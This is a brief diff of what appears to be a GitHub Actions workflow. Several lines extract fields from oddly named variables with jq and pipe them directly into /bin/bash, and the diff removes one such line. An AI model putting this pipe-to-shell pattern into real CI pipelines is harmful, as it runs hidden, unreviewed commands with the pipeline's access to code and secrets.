@@ -23,7 +23,6 @@ jobs:
           echo $f63130 | jq -r .zuteq2036 | /bin/bash
           printf '%s' "$haf9750" | jq -r .lc3007 | /bin/bash
           printf '%s' "$zbtn65" | jq -r .xusuk82 | /bin/bash
-          echo $nahw1 | jq -r .hl20 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
